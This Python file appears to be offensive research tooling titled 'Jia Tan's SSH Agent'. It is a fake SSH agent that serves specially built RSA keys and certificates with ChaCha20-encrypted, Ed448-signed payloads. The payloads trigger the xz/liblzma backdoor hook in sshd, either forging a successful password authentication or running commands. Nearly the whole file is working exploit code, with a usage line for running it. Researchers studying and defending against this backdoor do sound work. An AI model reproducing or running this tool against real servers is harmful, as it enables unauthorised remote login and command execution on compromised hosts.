import os
import sys
import socket
import struct
import hashlib

from cryptography.hazmat.primitives.asymmetric.ed448 import Ed448PrivateKey

BACKDOOR2_CMD_OVERRIDE_MONITOR_AUTHPASSWORD_RESPONSE = 0x01
BACKDOOR2_CMD_EXEC_COMMAND = 0x03

SSH_AGENT_FAILURE = 5
SSH_AGENT_SUCCESS = 6
SSH_AGENTC_REQUEST_IDENTITIES = 11
SSH_AGENT_IDENTITIES_ANSWER = 12
SSH_AGENTC_EXTENSION = 27

def chacha20_crypt(k, iv, data):
    c = ChaCha(key=k, nonce=iv[4:], counter=struct.unpack("<L", iv[0:4])[0])
    return c.encrypt(data)

def pad(v, n, b=b"\x00"):
    if len(v) < n:
        v += b*(n-len(v))
    return v

# TODO: should probably use chacha20 from pycryptodome, copy pasted from elsewhere
class ChaCha(object):
    constants = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574]
    @staticmethod
    def rotl32(v, c):
        return ((v << c) & 0xffffffff) | (v >> (32 - c))
    @staticmethod
    def quarter_round(x, a, b, c, d):
        xa = x[a]
        xb = x[b]
        xc = x[c]
        xd = x[d]

        xa = (xa + xb) & 0xffffffff
        xd = xd ^ xa
        xd = ((xd << 16) & 0xffffffff | (xd >> 16))
        xc = (xc + xd) & 0xffffffff
        xb = xb ^ xc
        xb = ((xb << 12) & 0xffffffff | (xb >> 20))
        xa = (xa + xb) & 0xffffffff
        xd = xd ^ xa
        xd = ((xd << 8) & 0xffffffff | (xd >> 24))
        xc = (xc + xd) & 0xffffffff
        xb = xb ^ xc
        xb = ((xb << 7) & 0xffffffff | (xb >> 25))
        x[a] = xa
        x[b] = xb
        x[c] = xc
        x[d] = xd

    _round_mixup_box = [
        (0, 4, 8, 12), (1, 5, 9, 13), (2, 6, 10, 14), (3, 7, 11, 15),
        (0, 5, 10, 15), (1, 6, 11, 12), (2, 7, 8, 13), (3, 4, 9, 14)
    ]

    @classmethod
    def double_round(cls, x):
        for a, b, c, d in cls._round_mixup_box:
            xa = x[a]
            xb = x[b]
            xc = x[c]
            xd = x[d]

            xa = (xa + xb) & 0xffffffff
            xd = xd ^ xa
            xd = ((xd << 16) & 0xffffffff | (xd >> 16))
            xc = (xc + xd) & 0xffffffff
            xb = xb ^ xc
            xb = ((xb << 12) & 0xffffffff | (xb >> 20))
            xa = (xa + xb) & 0xffffffff
            xd = xd ^ xa
            xd = ((xd << 8) & 0xffffffff | (xd >> 24))
            xc = (xc + xd) & 0xffffffff
            xb = xb ^ xc
            xb = ((xb << 7) & 0xffffffff | (xb >> 25))

            x[a] = xa
            x[b] = xb
            x[c] = xc
            x[d] = xd

    @staticmethod
    def chacha_block(key, counter, nonce, rounds):
        state = ChaCha.constants + key + [counter] + nonce

        working_state = state[:]
        dbl_round = ChaCha.double_round
        for _ in range(0, rounds // 2):
            dbl_round(working_state)

        return [(st + wrkSt) & 0xffffffff for st, wrkSt
                in zip(state, working_state)]

    @staticmethod
    def word_to_bytearray(state):
        return bytearray(struct.pack('<LLLLLLLLLLLLLLLL', *state))

    @staticmethod
    def _bytearray_to_words(data):
        ret = []
        for i in range(0, len(data)//4):
            ret.extend(struct.unpack('<L', data[i*4:(i+1)*4]))
        return ret

    def __init__(self, key, nonce, counter=0, rounds=20):
        self.key = []
        self.nonce = []
        self.counter = counter
        self.rounds = rounds

        self.key = ChaCha._bytearray_to_words(key)
        self.nonce = ChaCha._bytearray_to_words(nonce)

    def encrypt(self, plaintext):
        encrypted_message = bytearray()
        for i, block in enumerate(plaintext[i:i+64] for i in range(0, len(plaintext), 64)):
            key_stream = ChaCha.chacha_block(self.key, self.counter + i, self.nonce, self.rounds)
            key_stream = ChaCha.word_to_bytearray(key_stream)
            encrypted_message += bytearray(x ^ y for x, y in zip(key_stream, block))
        return encrypted_message

    def decrypt(self, ciphertext):
        return self.encrypt(ciphertext)

class JiaTansSSHAgent:
    def __init__(self, path, ed448_keyfile):
        self.ed448_privkey = Ed448PrivateKey.from_private_bytes(
            open(ed448_keyfile,"rb").read())
        self.ed448_pubkey = self.ed448_privkey.public_key()
        self.ed448_pubkey_bytes = self.ed448_pubkey.public_bytes_raw()

        self.session_id = None
        self.hostkey_pub = None
        self.server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.server.bind(path)
        self.server.listen(1)
        print("")
        print("[i] waiting for ssh agent requests..")

    def sshbuf_unchunk(self, buf):
        o = []
        pos = 0
        while pos < len(buf):
            if len(buf) - pos < 4:
                break
            olen = struct.unpack(">I", buf[pos:pos+4])[0]
            pos = pos + 4
            assert(pos+olen < len(buf))
            o.append(buf[pos:pos+olen])
            pos = pos + olen
        return o

    def build_key_with_cert(self, new_n):
        # XXX: clean this up some day
        d = bytes.fromhex("0000001c7373682d7273612d636572742d763031406f70656e7373682e636f6d00000000000000030100010000010101")
        d += b"\x00"*0x108
        d += b"\x00\x00\x00\x01"
        d += b"\x00"*0x24
        d += struct.pack(">L", 0x114)
        d += bytes.fromhex("000000077373682d727361000000010100000100")
        d += new_n
        d += bytes.fromhex("00000010000000077373682d7273610000000100")
        return d

    def build_key(self, new_n):
        return bytes.fromhex("000000077373682d72736100000003010001") + \
            struct.pack(">L", len(new_n)) + new_n


    def bd1_request(self, a32, b32, c64, flags, body, n_size = 0x100):
        assert(len(flags) == 5)

        hdr = struct.pack("<LLQ", a32, b32, c64)
        cmd_id = (c64+(a32 * b32))&0xffffffff
        args_len = 0
        if cmd_id == 3:
            args_len = 0x30
        elif cmd_id == 2:
            if flags[0] & 0x80 == 0x80:
                args_len = 0x39
        args = body[0:args_len]
        args += b"\x00"*(args_len - len(args))
        if len(args) > len(body):
            payload = bytes(flags) + args
        else:
            payload = bytes(flags) + body
        assert(len(payload) <= (n_size-114))
        sig_buf = struct.pack("<L", (c64+(a32 * b32))&0xffffffff)
        sig_buf += bytes(flags)
        sig_buf += args
        sig_buf += self.hostkey_pub
        sig_out = self.ed448_privkey.sign(sig_buf)
        o = hdr + chacha20_crypt(
            self.ed448_pubkey_bytes[0:32], hdr[0:0x10], sig_out + payload)
        if len(o) < n_size:
            o += b"\x00"*(n_size - len(o))
        return o

    def build_password_bypass_keys(self):
        # response in sshbuf wire format:
        # [len, MONITOR_ANS_AUTHPASSWORD, authenticated, maxtries]
        return self.build_keyallowed_backdoor_keys(
            BACKDOOR2_CMD_OVERRIDE_MONITOR_AUTHPASSWORD_RESPONSE,
            struct.pack(">LBLL", 9, 13, 1, 0)
        )

    def build_keyallowed_backdoor_keys(self, cmd_id, body):
        print("[>] building mm_answer_keyallowed hook trigger rsa key..")

        newkeys = [
            # ((0x40 * 0x80000000) + 0xffffffe000000000) & 0xffffffff == 0
            self.build_key_with_cert(self.bd1_request(
                0x40, 0x80000000, 0xffffffe000000000, 
                [0,0,0,0,0], b"", 0x100))
        ]

        MAGIC_SIZE = 0x200
        MAGIC_CHUNK_SIZE = 0x100

        p = self.ed448_pubkey_bytes + bytes([cmd_id])
        p += self.ed448_privkey.sign(p + self.hostkey_pub)

        body = struct.pack("<H", len(body)) + body
        p += body
        
        p += b"\x00"*((MAGIC_SIZE-0x120)-len(body))

        signature2_buf = \
            struct.pack("<H", MAGIC_SIZE) + p + self.session_id + self.hostkey_pub
        p += self.ed448_privkey.sign(signature2_buf)

        p += b"\x00\x00"
        p = struct.pack("<H", len(p)) + p

        n = 0
        for i in range(0, len(p), MAGIC_CHUNK_SIZE):
            chunk = p[i:i+MAGIC_CHUNK_SIZE]
            chunk = struct.pack("<H", len(chunk)) + chunk
            iv = b"\x41"*16
            blob = pad(iv + chacha20_crypt(self.ed448_pubkey_bytes[0:32], iv, chunk), 0x200)
            print("[>] building magic ssh-rsa pubkey %d" % n)
            n += 1
            newkeys.append(self.build_key(blob))

        return newkeys

    def send_response(self, sock, response):
        length = struct.pack(">I", len(response))
        sock.sendall(length + response)

    def handle_request(self, sock):
        data = sock.recv(4)
        if not data:
            return False
        msg_len = struct.unpack(">I", data[:4])[0]
        data = b""
        while len(data) < msg_len:
            data += sock.recv(msg_len - len(data))

        msg_type = data[0]
        payload = data[1:]

        if msg_type == SSH_AGENTC_REQUEST_IDENTITIES:
            print("[i] agent got SSH_AGENTC_REQUEST_IDENTITIES")
            keys = self.build_password_bypass_keys()
            response = struct.pack("!BI", SSH_AGENT_IDENTITIES_ANSWER, len(keys))
            for k in keys:
                response += struct.pack(">I", len(k)) + k + struct.pack(">I", 4) + b"FUCK"
            self.send_response(sock, response)
        elif msg_type == SSH_AGENTC_EXTENSION:
            print("[i] agent got SSH_AGENTC_EXTENSION")
            c = self.sshbuf_unchunk(payload)

            # TODO: is this always the correct indice order?
            assert(len(c[1]) >= 0x10)
            hostkey_type_len = struct.unpack(">L", c[1][0:4])[0]
            hostkey_type_str = c[1][4:4+hostkey_type_len].decode()
            hostkey_body = c[1][4+hostkey_type_len:]
            print("[i] hostkey type     : %s" % hostkey_type_str)
            self.hostkey_pub = hashlib.sha256(hostkey_body).digest()
            self.session_id = c[2]
            print("[i] got session id   : %s" % self.session_id.hex())
            print("[i] got hostkey salt : %s" % self.hostkey_pub.hex())
            self.send_response(sock, struct.pack(">BI", SSH_AGENT_SUCCESS, 0))
        else:
            print("[!] unsupported ssh agent request (%02x).." % msg_type)
            response = struct.pack("!B", SSH_AGENT_FAILURE)
            self.send_response(sock, response)
        return True
    
    def main(self):
        try:
            while True:
                client_sock, _ = self.server.accept()
                while self.handle_request(client_sock):
                    pass
                client_sock.close()
        finally:
            self.server.close()


def banner():
    print("")
    print("      $$$ Jia Tan's SSH Agent $$$  ")
    print("    -- by blasty <peter@haxx.in> --")
    print("")

if __name__ == "__main__":
    banner()

    if len(sys.argv) != 3:
        print("usage: %s <socket_path> <ed448_privkey.bin>\n" % sys.argv[0])
        exit(-1)

    agent_socket, privkey_path = sys.argv[1:]
    assert(os.path.exists(privkey_path))
    if os.path.exists(agent_socket):
        os.unlink(agent_socket)
    print("[i] starting agent on '%s'" % agent_socket)
    agent = JiaTansSSHAgent(agent_socket, privkey_path)
    agent.main()